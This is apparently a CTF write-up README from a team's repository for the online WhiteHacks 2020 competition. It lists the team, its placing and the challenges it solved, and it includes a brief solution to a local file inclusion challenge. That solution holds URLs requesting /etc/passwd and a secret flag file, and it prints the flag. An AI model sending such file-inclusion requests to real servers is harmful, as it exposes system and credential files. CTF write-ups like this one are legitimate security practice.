## Event Details

Due to Covid 19, the event was held online on 2/8/2020, 9.10am to 5.10pm, on https://play.whitehacks.ctf.sg. There also was a Zoom Livestream of the scoreboard (Good to know no annoying hidden scoreboards near the end of the event).

I participated and led the team `AndWhyHackers` (get it? because NY for Nanyang?), with these people
1. [Codekrodile](https://github.com/Codekrodile)
2. [undefined-func](https://github.com/undefined-func)

I did a good number of challeges which were interesting. The challenges were quite interesting. A few were very beginner friendly and nice like `gdbtutor` and `BofSchool`

I tried to do several various Reverse Engineering challenges , but I was stuck and didn't know what to do. 

In the end, I feel we did decent. Out of 63 teams who got points, we got 14th.

Here are the main challenges I did (or helped out with). Just traverse the directories to find them

8. `GovTech/GovTech SecTech (2/6) - IDOR` (Helped `undefined-func`)
9. `Crypto/RSB (2/4)`

Some solutions for other challenges (Probably not done by me)

For `GovTech SecTech (1/6) - LFI`:
* Go to `http://sec-tech.cf/transcript.php?user=temp_acc&password=temp_pass&user_id=1&file=/etc/passwd` to get a list of passwd
* You can figure out the directory of the flag from this so go to `http://sec-tech.cf/transcript.php?user=temp_acc&password=temp_pass&user_id=1&file=/secret_path/lfi_flag.txt` and you can find the flag `WH2020{Loc@l_F1l3_Inclus10n_buT_N0t_sh3ll}`
